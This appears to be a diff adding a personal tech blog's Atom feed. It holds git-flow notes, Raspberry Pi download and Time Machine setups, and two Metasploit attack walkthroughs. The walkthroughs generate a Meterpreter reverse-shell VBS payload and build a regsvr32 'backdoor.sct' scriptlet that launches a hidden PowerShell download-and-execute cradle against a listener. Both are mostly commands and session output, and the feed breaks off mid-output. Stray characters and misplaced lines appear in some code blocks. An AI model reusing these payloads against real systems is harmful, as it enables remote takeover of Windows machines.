@@ -1,0 +1,1164 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>xl7dev</title>
+  <subtitle>blog</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://blog.safebuff.com/"/>
+  <updated>2016-11-04T02:34:53.000Z</updated>
+  <id>http://blog.safebuff.com/</id>
+  
+  <author>
+    <name>xl7dev</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>git-flow usage</title>
+    <link href="http://blog.safebuff.com/2016/11/04/git-flow-usage/"/>
+    <id>http://blog.safebuff.com/2016/11/04/git-flow-usage/</id>
+    <published>2016-11-03T19:17:26.000Z</published>
+    <updated>2016-11-04T02:34:53.000Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="创建develop分支"><a href="#创建develop分支" class="headerlink" title="创建develop分支"></a>创建develop分支</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git branch develop</span><br><span class="line">git push -u origin develop</span><br></pre></td></tr></table></figure>
+<h4 id="开始新Feature开发"><a href="#开始新Feature开发" class="headerlink" title="开始新Feature开发"></a>开始新Feature开发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b some-feature develop</span><br><span class="line">git push -u origin some-feature    </span><br><span class="line">git status</span><br><span class="line">git add some-file</span><br><span class="line">x`git commit</span><br></pre></td></tr></table></figure>
+<h4 id="完成Feature"><a href="#完成Feature" class="headerlink" title="完成Feature"></a>完成Feature</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git pull origin develop</span><br><span class="line">git checkout develop</span><br><span class="line">git merge --no-ff some-feature</span><br><span class="line">git push origin develop</span><br><span class="line">git branch -d some-feature</span><br><span class="line">git push origin --delete some-feature</span><br></pre></td></tr></table></figure>
+<h4 id="开始Relase"><a href="#开始Relase" class="headerlink" title="开始Relase"></a>开始Relase</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b release-0.1.0 develop</span><br></pre></td></tr></table></figure>
+<h4 id="完成Release"><a href="#完成Release" class="headerlink" title="完成Release"></a>完成Release</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br><span class="line">git merge --no-ff release-0.1.0</span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line">git checkout develop</span><br><span class="line">git merge --no-ff release-0.1.0</span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line">git branch -d release-0.1.0</span><br><span class="line"></span><br><span class="line"># If you pushed branch to origin:</span><br><span class="line">git push origin --delete release-0.1.0   </span><br><span class="line"></span><br><span class="line">git tag -a v0.1.0 master</span><br><span class="line">git push --tags</span><br></pre></td></tr></table></figure>
+<h4 id="开始Hotfix"><a href="#开始Hotfix" class="headerlink" title="开始Hotfix"></a>开始Hotfix</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b hotfix-0.1.1 master</span><br></pre></td></tr></table></figure>
+<h4 id="完成Hotfix"><a href="#完成Hotfix" class="headerlink" title="完成Hotfix"></a>完成Hotfix</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br><span class="line">git merge --no-ff hotfix-0.1.1</span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line">git checkout develop</span><br><span class="line">git merge --no-ff hotfix-0.1.1</span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line">git branch -d hotfix-0.1.1</span><br><span class="line"></span><br><span class="line">git tag -a v0.1.1 master</span><br><span class="line">git push --tags</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;创建develop分支&quot;&gt;&lt;a href=&quot;#创建develop分支&quot; class=&quot;headerlink&quot; title=&quot;创建develop分支&quot;&gt;&lt;/a&gt;创建develop分支&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;tabl
+    
+    </summary>
+    
+    
+      <category term="git-flow" scheme="http://blog.safebuff.com/tags/git-flow/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Metasploit Reverse Shell via CMD</title>
+    <link href="http://blog.safebuff.com/2016/11/01/Metasploit-Reverse-Shell-via-CMD/"/>
+    <id>http://blog.safebuff.com/2016/11/01/Metasploit-Reverse-Shell-via-CMD/</id>
+    <published>2016-11-01T14:06:22.000Z</published>
+    <updated>2016-11-01T14:19:50.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-Generate-vbs"><a href="#0x01-Generate-vbs" class="headerlink" title="0x01 Generate vbs"></a>0x01 Generate vbs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=4444 EXITFUNC=thread -f vbs --arch x86 --platform win &gt; test.vbs</span><br><span class="line"></span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of vbs file: 7384 bytes</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-Metasploit-listen"><a href="#0x02-Metasploit-listen" class="headerlink" title="0x02 Metasploit listen"></a>0x02 Metasploit listen</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.0.103</span><br><span class="line">msf exploit(handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.103:4444</span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-Windows-run-vbs"><a href="#0x03-Windows-run-vbs" class="headerlink" title="0x03 Windows run vbs"></a>0x03 Windows run vbs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt;cscript.exe ./test.vbs</span><br><span class="line"></span><br><span class="line">Microsoft (R) Windows Script Host Version 5.6</span><br><span class="line">版权所有(C) Microsoft Corporation 1996-2001。保留所有权利。</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-Metasploit-item2"><a href="#0x04-Metasploit-item2" class="headerlink" title="0x04 Metasploit item2"></a>0x04 Metasploit item2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.103:4444</span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[*] Sending stage (983599 bytes) to 192.168.0.103</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.103:4444 -&gt; 192.168.0.103:49778) at 2016-11-01 22:16:44 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-Generate-vbs&quot;&gt;&lt;a href=&quot;#0x01-Generate-vbs&quot; class=&quot;headerlink&quot; title=&quot;0x01 Generate vbs&quot;&gt;&lt;/a&gt;0x01 Generate vbs&lt;/h3&gt;&lt;figure class
+    
+    </summary>
+    
+    
+      <category term="Metasploit" scheme="http://blog.safebuff.com/tags/Metasploit/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Raspberry pi as Download with Aria</title>
+    <link href="http://blog.safebuff.com/2016/10/24/Raspberry-pi-as-Download-with-Aria/"/>
+    <id>http://blog.safebuff.com/2016/10/24/Raspberry-pi-as-Download-with-Aria/</id>
+    <published>2016-10-24T08:56:57.000Z</published>
+    <updated>2016-10-26T14:51:59.000Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo apt-get install aria2</span><br><span class="line">pi@raspberrypi:~ $ git clone https://github.com/ziahamza/webui-aria2</span><br><span class="line">pi@raspberrypi:~ $ sudo mkdir /etc/aria2</span><br><span class="line">pi@raspberrypi:~ $ sudo touch /etc/aria2/aria2.session</span><br><span class="line">pi@raspberrypi:~ $ sudo touch /etc/aria2/aria2.conf</span><br><span class="line">pi@raspberrypi:~ $ sudo chmod 666 /etc/aria2/aria2.session</span><br><span class="line">pi@raspberrypi:~ $ sudo chmod 666  /etc/aria2/aria2.conf</span><br><span class="line">pi@raspberrypi:~ $ sudo vi /etc/aria2/aria2.conf</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">continue=true</span><br><span class="line">daemon=true</span><br><span class="line">dir=/media/你的外接硬盘名称/downloads</span><br><span class="line">enable-rpc=true</span><br><span class="line">file-allocation=none</span><br><span class="line">force-sequential=true</span><br><span class="line">input-file=/etc/aria2/aria2.session</span><br><span class="line">log=/var/logaria2.log</span><br><span class="line">log-level=notice</span><br><span class="line">max-concurrent-downloads=3</span><br><span class="line">max-connection-per-server=5</span><br><span class="line">parameterized-uri=true</span><br><span class="line">rpc-allow-origin-all=true</span><br><span class="line">rpc-listen-all=true</span><br><span class="line">rpc-save-upload-metadata=true</span><br><span class="line">save-session=/etc/aria2/aria2.session</span><br><span class="line">save-session-interval=60</span><br><span class="line">split=5</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo aria2c --conf-path= /etc/aria2/aria2.conf -D</span><br><span class="line">pi@raspberrypi:~ $ sudo echo &quot;/usr/bin/aria2c --conf-path=/etc/aria2/aria2.conf&quot; &gt;&gt; /etc/rc.local</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
+    
+    </summary>
+    
+    
+      <category term="raspberry" scheme="http://blog.safebuff.com/tags/raspberry/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Respberry pi as time capsule</title>
+    <link href="http://blog.safebuff.com/2016/10/22/Raspberry-pi-as-time-capsule/"/>
+    <id>http://blog.safebuff.com/2016/10/22/Raspberry-pi-as-time-capsule/</id>
+    <published>2016-10-22T03:04:39.000Z</published>
+    <updated>2016-11-11T06:03:42.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-lists"><a href="#0x01-lists" class="headerlink" title="0x01 lists"></a>0x01 lists</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">respberry pi 2B</span><br><span class="line">My Passport Ultra 2T hfs+</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-install"><a href="#0x02-install" class="headerlink" title="0x02 install"></a>0x02 install</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install hfsplus hfsutils hfsprogs</span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install git git-core –y</span><br><span class="line">pi@raspberrypi:~ $ sudo git clone git://git.drogon.net/wiringPi</span><br><span class="line">pi@raspberrypi:~ $ cd wiringPi &amp;&amp; sudo ./build</span><br><span class="line">pi@raspberrypi:~ $ gpio –g read 38</span><br><span class="line">0</span><br><span class="line">pi@raspberrypi:~ $ gpio -g write 38 1</span><br><span class="line">1</span><br><span class="line">pi@raspberrypi:~ $ gpio -g read 38</span><br><span class="line">1</span><br><span class="line">pi@raspberrypi:~ $ sudo blkid</span><br><span class="line">/dev/mmcblk0p1: SEC_TYPE=&quot;msdos&quot; LABEL=&quot;boot&quot; UUID=&quot;86EA-017B&quot; TYPE=&quot;vfat&quot; PARTUUID=&quot;ea0e7380-01&quot;</span><br><span class="line">/dev/mmcblk0p2: UUID=&quot;ad6203a1-ec50-4f44-a1c0-e6c3dd4c9202&quot; TYPE=&quot;ext4&quot; PARTUUID=&quot;ea0e7380-02&quot;</span><br><span class="line">/dev/sda1: UUID=&quot;a10e864b-92bd-39ac-ae75-cf5a26ee8107&quot; LABEL=&quot;My Passport&quot; TYPE=&quot;hfsplus&quot; PARTUUID=&quot;28d26e49-01&quot;</span><br><span class="line">/dev/mmcblk0: PTUUID=&quot;ea0e7380&quot; PTTYPE=&quot;dos&quot;</span><br><span class="line">pi@raspberrypi:~ $ sudo /sbin/parted</span><br><span class="line">GNU Parted 3.2</span><br><span class="line">Using /dev/sda</span><br><span class="line">Welcome to GNU Parted! Type &apos;help&apos; to view a list of commands.</span><br><span class="line">proc            /proc           proc    defaults          0       0</span><br><span class="line">(parted) print</span><br><span class="line">Model: WD My Passport 0837 (scsi)</span><br><span class="line">Disk /dev/sda: 2000GB</span><br><span class="line">proc            /proc           proc    defaults          0       0</span><br><span class="line">Sector size (logical/physical): 512B/512B</span><br><span class="line">proc            /proc           proc    defaults          0       0</span><br><span class="line">Partition Table: msdos</span><br><span class="line">Disk Flags:</span><br><span class="line"></span><br><span class="line">Number  Start   End     Size    Type     File system  Flags</span><br><span class="line"> 1      1049kB  2000GB  2000GB  primary  hfs+         boot</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo mkdir -p /media/TimeCapsule</span><br><span class="line">pi@raspberrypi:~ $ sudo vim /etc/fstab</span><br><span class="line"># line to add to fstab</span><br><span class="line">/dev/sda1       /media/TimeCapsule   hfsplus force,rw,user,auto  0   0</span><br><span class="line">pi@raspberrypi:~ $ sudo mount -t hfsplus -o force /dev/sda1 /media/TimeCapsule</span><br><span class="line">pi@raspberrypi:~ $ sudo chown -R pi:pi /media/TimeCapsule</span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install netatalk</span><br><span class="line">pi@raspberrypi:~ $ sudo vi /etc/netatalk/AppleVolumes.default</span><br><span class="line">#~/			&quot;Home Directory&quot;</span><br><span class="line">/media/TimeCapsule &quot;Time Capsule&quot; options:tm</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo service netatalk restart</span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install avahi-daemon libnss-mdns</span><br><span class="line">pi@raspberrypi:~ $ sudo vi /etc/nsswitch.conf</span><br><span class="line">hosts:      files mdns4_minimal [NOTFOUND=return] dns</span><br><span class="line"></span><br><span class="line">to</span><br><span class="line"></span><br><span class="line">hosts:      files mdns4_minimal [NOTFOUND=return] dns mdns4  mdns</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo vi /etc/avahi/services/afpd.service</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&apos;no&apos;?&gt;&lt;!--*-nxml-*--&gt;</span><br><span class="line">&lt;!DOCTYPE service-group SYSTEM &quot;avahi-service.dtd&quot;&gt;</span><br><span class="line">&lt;service-group&gt;</span><br><span class="line">    &lt;name replace-wildcards=&quot;yes&quot;&gt;%h&lt;/name&gt;</span><br><span class="line">    &lt;service&gt;</span><br><span class="line">        &lt;type&gt;_afpovertcp._tcp&lt;/type&gt;</span><br><span class="line">        &lt;port&gt;548&lt;/port&gt;</span><br><span class="line">    &lt;/service&gt;</span><br><span class="line">    &lt;service&gt;</span><br><span class="line">        &lt;type&gt;_device-info._tcp&lt;/type&gt;</span><br><span class="line">        &lt;port&gt;0&lt;/port&gt;</span><br><span class="line">        &lt;txt-record&gt;model=TimeCapsule&lt;/txt-record&gt;</span><br><span class="line">    &lt;/service&gt;</span><br><span class="line">&lt;/service-group&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo vi /usr/local/etc/afp.conf</span><br><span class="line">[Global]</span><br><span class="line">  mimic model = TimeCapsule6,106</span><br><span class="line"></span><br><span class="line">[Time Machine 2TB]</span><br><span class="line">  path = /media/TimeCapsule</span><br><span class="line">  time machine = yes</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo service avahi-daemon start</span><br><span class="line">pi@raspberrypi:~ $ sudo service netatalk start</span><br><span class="line">pi@raspberrypi:~ $ sudo update-rc.d avahi-daemon defaults</span><br><span class="line">pi@raspberrypi:~ $ sudo update-rc.d netatalk defaults</span><br><span class="line">pi@raspberrypi:~ $ sudo apt-get install hdparm</span><br><span class="line">pi@raspberrypi:~ $ sudo vi /etc/hdparm.conf</span><br><span class="line">command_line &#123;</span><br><span class="line">  hdparm -S 240 /dev/sda</span><br><span class="line">&#125;</span><br><span class="line">pi@raspberrypi:~ $ sudo reboot</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-lists&quot;&gt;&lt;a href=&quot;#0x01-lists&quot; class=&quot;headerlink&quot; title=&quot;0x01 lists&quot;&gt;&lt;/a&gt;0x01 lists&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;t
+    
+    </summary>
+    
+    
+      <category term="Respberry" scheme="http://blog.safebuff.com/tags/Respberry/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Regsrv32 Exploit With Metasploit web_delivery</title>
+    <link href="http://blog.safebuff.com/2016/10/17/Regsrv32-Exploit-With-Metasploit-web-delivery/"/>
+    <id>http://blog.safebuff.com/2016/10/17/Regsrv32-Exploit-With-Metasploit-web-delivery/</id>
+    <published>2016-10-16T16:40:29.000Z</published>
+    <updated>2016-10-18T17:00:06.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>###0x01 Metasploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(gitlab_user_enum) &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; set target 2</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; set LHOST 192.168.0.100</span><br><span class="line">LHOST =&gt; 192.168.0.100</span><br><span class="line">msf exploit(web_delivery) &gt; set LPORT 2333</span><br><span class="line">LPORT =&gt; 2333</span><br><span class="line">msf exploit(web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.100:2333</span><br><span class="line">[*] Using URL: http://0.0.0.0:9090/WXCOjGGir</span><br><span class="line">msf exploit(web_delivery) &gt;</span><br><span class="line">[*] Local IP: http://192.168.0.100:9090/WXCOjGGir</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring(&apos;http://192.168.0.100:9090/WXCOjGGir&apos;);</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>backdoor.sct</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line"></span><br><span class="line">&lt;registration</span><br><span class="line">    description=&quot;Bandit&quot;</span><br><span class="line">    progid=&quot;Bandit&quot;</span><br><span class="line">    version=&quot;1.00&quot;</span><br><span class="line">    classid=&quot;&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span><br><span class="line">	&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;!-- regsvr32 /s /n /u /i:http://blog.safebuff.com/backdoor.sct scrobj.dll</span><br><span class="line">	&lt;!-- DFIR --&gt;</span><br><span class="line">	&lt;!--		.sct files are downloaded and executed from a path like this --&gt;</span><br><span class="line">	&lt;!-- Though, the name and extension are arbitary.. --&gt;</span><br><span class="line">	&lt;!-- c:\users\USER\appdata\local\microsoft\windows\temporary internet files\content.ie5\2vcqsj3k\file[2].sct --&gt;</span><br><span class="line">	&lt;!-- Based on current research, no registry keys are written, since call &quot;uninstall&quot; --&gt;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	&lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;</span><br><span class="line">	&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">		&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line">			var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring(&apos;http://192.168.0.100:9090/WXCOjGGir&apos;);&quot;);</span><br><span class="line">	</span><br><span class="line">		]]&gt;</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line"></span><br><span class="line">&lt;public&gt;</span><br><span class="line">    &lt;method name=&quot;Exec&quot;&gt;&lt;/method&gt;</span><br><span class="line">&lt;/public&gt;</span><br><span class="line">&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line">	function Exec()</span><br><span class="line">	&#123;</span><br><span class="line">		var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure>
+<p>###0x02 windows run<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt; regsvr32 /s /n /u /i:http://blog.safebuff.com/backdoor.sct scrobj.dll</span><br></pre></td></tr></table></figure></p>
+<h3 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(web_delivery) &gt;</span><br><span class="line">[*] Local IP: http://192.168.0.100:9090/WXCOjGGir</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring(&apos;http://192.168.0.100:9090/WXCOjGGir&apos;);</span><br><span class="line">[*] Delivering Payload</span><br><span class="line">[*] Delivering Payload</span><br><span class="line">[*] Delivering Payload</span><br><span class="line">[*] Sending stage (957999 bytes) to 192.168.0.100</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.100:2333 -&gt; 192.168.0.100:63991) at 2016-10-17 01:04:06 +0800</span><br><span class="line"></span><br><span class="line">msf exploit(web_delivery) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span 